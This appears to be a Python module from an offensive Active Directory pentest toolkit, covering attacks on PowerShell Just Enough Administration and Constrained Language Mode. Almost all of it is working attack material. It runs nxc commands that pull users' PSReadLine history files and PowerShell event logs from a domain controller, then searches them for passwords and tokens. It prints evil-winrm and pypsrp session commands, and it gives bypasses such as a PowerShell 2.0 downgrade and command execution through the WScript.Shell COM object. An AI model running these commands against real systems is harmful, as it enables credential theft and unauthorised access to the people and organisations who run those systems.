"""
Module: JEA (Just Enough Administration) Attacks
Techniques:
  - JEA endpoint enumeration
  - PSReadLine history theft (plaintext creds recovery)
  - JEA command restriction bypass (filesystem provider, Invoke-Expression)
  - Constrained language mode escape
  - LanguageMode bypass via type accelerators
  - JEA session hijacking
  Reference: gMSA accounts with JEA access often expose PSReadLine history with plaintext creds
"""
from utils.helpers import *
from config.settings import SESSION

MENU = """
  ── JEA / CONSTRAINED PS ATTACKS ────────────────────────────────
  [1]  Enumerate JEA Endpoints         (Get-PSSessionConfiguration)
  [2]  PSReadLine History Theft        (all users — often has creds)
  [3]  JEA Bypass Techniques           (filesystem, type accelerator)
  [4]  Connect JEA Session             (evil-winrm / pypsrp)
  [5]  Constrained Language Mode Enum  (check PSLanguageMode)
  [6]  Extract Creds from Event Logs   (PS script block logging)
  [0]  Back
"""

# Common PS history paths
_HISTORY_PATHS = [
    r"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    r"C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    r"C:\Windows\SysWOW64\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    r"C:\Users\All Users\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
]


def run():
    print_banner("JEA ATTACKS", "Just Enough Administration & PS History Theft")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    fqdn  = SESSION.get("dc_fqdn") or f"dc1.{dom}"
    realm = dom.upper()
    krb   = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")

    if krb:
        ccache    = SESSION["krb5_ccache"]
        winrm_base = f"KRB5CCNAME={ccache} evil-winrm -i {fqdn} -r {realm}"
        nxc_auth  = f"-u '{user}' -k --kdcHost {dc} -d {dom}"
    else:
        winrm_base = f"evil-winrm -i {dc} -u '{user}' -p '{pw}'"
        nxc_auth  = f"-u '{user}' -p '{pw}' -d {dom}"

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Enumerate JEA endpoints ───────────────────────────────────────────
    if c == "1":
        print(f"""
  {NEON_CYN}JEA Endpoint Enumeration:{RST}

  {winrm_base} -c 'Get-PSSessionConfiguration | Select Name,PSVersion,RunAsVirtualAccount,RunAsVirtualAccountGroups,RunAsUser | Format-List'
  {winrm_base} -c 'Get-PSSessionConfiguration | Where-Object {{$_.RunAsVirtualAccount -or $_.RunAsUser}} | Select Name,RunAsUser'

  {NEON_CYN}Connect to a specific JEA endpoint:{RST}
  evil-winrm -i {fqdn} -r {realm} -S -c <cert.pem> -k <key.pem>
  Enter-PSSession -ComputerName {fqdn} -ConfigurationName <JEA_ENDPOINT>

  {NEON_CYN}Via pypsrp (Python):{RST}
  python3 -c "
  from pypsrp.client import Client
  c = Client('{fqdn}', username='{user}', password='<pw>', ssl=False)
  out, streams, had_errors = c.execute_ps('Get-PSSessionConfiguration')
  print(out)
  "
""")
        run_cmd(f"nxc winrm {dc} {nxc_auth}")

    # ── [2] PSReadLine history theft ──────────────────────────────────────────
    elif c == "2":
        target_user = prompt(f"Username to target (default: {user})") or user
        print(f"""
  {NEON_CYN}PSReadLine History Theft — {target_user}:{RST}
  {DIM}PowerShell saves every command to ConsoleHost_history.txt
  This often contains: plaintext passwords, SSH keys, API tokens,
  hardcoded credentials in scripts, lateral movement commands.{RST}
""")
        # Via nxc smb --get-file
        for path in _HISTORY_PATHS:
            formatted = path.format(user=target_user)
            out_local = f"/tmp/ps_history_{target_user.replace('$','_')}.txt"
            run_cmd(f"nxc smb {dc} {nxc_auth} --get-file '{formatted}' {out_local}")

        # Via evil-winrm command
        print(f"""
  {NEON_CYN}Via evil-winrm (interactive):{RST}
  {winrm_base}
  # Then run:
  type C:\\Users\\{target_user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

  {NEON_CYN}Enumerate ALL users' history (if admin):{RST}
  Get-ChildItem C:\\Users\\ -Directory | ForEach-Object {{
    $path = "$($_.FullName)\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
    if (Test-Path $path) {{ Write-Host "=== $($_.Name) ==="; Get-Content $path }}
  }}

  {NEON_CYN}Check for credentials in all history files:{RST}
  Get-ChildItem C:\\Users -Recurse -Filter ConsoleHost_history.txt 2>$null |
    Select-String -Pattern "password|passwd|cred|secret|key|token" -CaseSensitive:$false
""")
        add_finding("PSReadLine History Accessible", "High",
                    f"PowerShell command history readable for {target_user}",
                    "Disable PSReadLine history persistence; implement PS script block logging instead")

    # ── [3] JEA bypass techniques ─────────────────────────────────────────────
    elif c == "3":
        print(f"""
  {NEON_CYN}JEA Bypass Techniques:{RST}
  {DIM}JEA restricts available commands but filesystem provider may still work.
  These techniques work when JEA session is active (constrained):{RST}

  ── Filesystem Provider Bypass ────────────────────────────────────────────
  # JEA may block 'type' / Get-Content but filesystem navigation works
  dir C:\\Users\\
  cd C:\\Users\\Administrator
  cat ConsoleHost_history.txt         # may work via filesystem alias

  ── Type Accelerator Bypass ───────────────────────────────────────────────
  # If JEA blocks [System.IO.File] class access is blocked
  [System.Reflection.Assembly]::LoadWithPartialName("System.IO")
  [System.IO.File]::ReadAllText("C:\\sensitive.txt")

  ── Invoke-Expression via allowed cmdlets ─────────────────────────────────
  # Find writable paths from JEA context
  Get-Location          # check current dir in JEA
  Get-Module            # list loaded modules
  Get-Command           # list allowed commands

  ── Environment variables ─────────────────────────────────────────────────
  $env:USERNAME         # current user in JEA runspace (often service account!)
  $env:COMPUTERNAME
  $env:USERPROFILE      # → read files from this path

  ── Script block logging bypass ───────────────────────────────────────────
  # Check if event logging captures JEA commands
  Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50

  {NEON_CYN}Python pypsrp approach (JEA session):{RST}
  python3 << 'EOF'
  from pypsrp.wsman import WSMan
  from pypsrp.powershell import PowerShell, RunspacePool
  wsman = WSMan("{fqdn}", username="{user}", password="<pw>",
                ssl=False, auth="kerberos" if {str(krb).lower()} else "ntlm")
  with RunspacePool(wsman, configuration_name="<JEA_ENDPOINT>") as pool:
      ps = PowerShell(pool)
      ps.add_script("$env:USERNAME; dir C:\\Users\\")
      out = ps.invoke()
      print(out)
  EOF
""")

    # ── [4] Connect JEA session ───────────────────────────────────────────────
    elif c == "4":
        jea_ep = prompt("JEA endpoint name (e.g. JEAMaintenance, blank = default)")
        ep_arg = f" -S -c {jea_ep}" if jea_ep else ""
        print(f"""
  {NEON_CYN}Connect to JEA Endpoint: {jea_ep or "(default)"}:{RST}

  ── evil-winrm ────────────────────────────────────────────────────────────
  {winrm_base}{ep_arg}

  ── pypsrp (Python) ───────────────────────────────────────────────────────
  python3 -c "
  from pypsrp.client import Client
  c = Client('{fqdn}', username='{user}', password='<pw>',
             ssl=False, cert_validation=False)
  config = '{jea_ep}' if '{jea_ep}' else None
  out, streams, err = c.execute_ps('whoami; $env:USERNAME; Get-Command')
  print(out)
  "

  ── Test commands inside JEA ──────────────────────────────────────────────
  # After connecting:
  Get-Command                         # what's allowed?
  $PSVersionTable                     # PS version
  $env:USERNAME                       # who am I in JEA runspace?
  dir C:\\Users\\                     # filesystem access?
""")

    # ── [5] CLM enumeration ───────────────────────────────────────────────────
    elif c == "5":
        print(f"""
  {NEON_CYN}Constrained Language Mode Enumeration & Bypass:{RST}

  ── Check current mode ────────────────────────────────────────────────────
  $ExecutionContext.SessionState.LanguageMode
  # FullLanguage = no restrictions
  # ConstrainedLanguage = restricted
  # RestrictedLanguage = very restricted
  # NoLanguage = no scripting

  ── CLM bypass via PowerShell 2.0 downgrade ───────────────────────────────
  powershell -version 2 -exec bypass -c "whoami"
  # Works if PS 2.0 is installed and CLM not enforced on v2

  ── CLM bypass via COM objects ────────────────────────────────────────────
  $c = New-Object -ComObject WScript.Shell
  $c.Exec("cmd /c whoami")

  ── CLM bypass via custom runspace ────────────────────────────────────────
  # In JEA, the runspace is already constrained; target the filesystem
  # to read sensitive files rather than executing code

  ── Check AppLocker (often paired with CLM) ───────────────────────────────
  Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
""")

    # ── [6] PS script block logging ───────────────────────────────────────────
    elif c == "6":
        print(f"""
  {NEON_CYN}Extract Credentials from PowerShell Event Logs:{RST}

  {winrm_base} -c "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
    Where-Object {{$_.Message -match 'password|passwd|cred|secret'}} |
    Select TimeCreated,Message | Format-List"

  # Check 4103 (module logging) and 4104 (script block logging)
  {winrm_base} -c "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
    Where-Object {{$_.Id -eq 4104}} | Select -First 50 -ExpandProperty Message"

  # Transcript files (if PS transcription enabled)
  dir C:\\PSTranscripts\\ -Recurse 2>$null
  dir C:\\Windows\\Logs\\ -Filter *.txt 2>$null
""")
        run_cmd(f"nxc smb {dc} {nxc_auth} "
                f"--get-file 'C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx' "
                f"/tmp/ps_operational.evtx")

    pause()
